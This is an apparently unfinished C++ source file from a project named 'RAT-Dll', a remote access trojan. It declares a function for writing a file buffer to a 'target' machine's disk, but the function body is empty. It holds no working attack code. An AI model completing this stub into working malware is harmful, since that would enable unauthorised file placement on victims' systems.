// Patrick Sacchet
// Verison 1.0.
// RAT-Dll-PutFile.cpp : Defines functionality for performing a file put on target, i.e., placing a buffer with contents at a specified location on target disk

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-PutFile.h"

/** This funciton will perform a simple put file for us 
params:
 * filePath - path to the file we're putting 
 * fileBytes - bytes we're writing to our file 
 * overwrite - whether or not to overwrite the file if its already there
return:
 * if successfulk we return SUCCESS; otherwise print the error code and handle appropiately 
*/
INT performPutFile(__in const char* filePath, __in const char* fileBytes, __in bool overwrite)
{
	INT status = SUCCESS;
	HANDLE hFile;

	



cleanup:
	return status;
}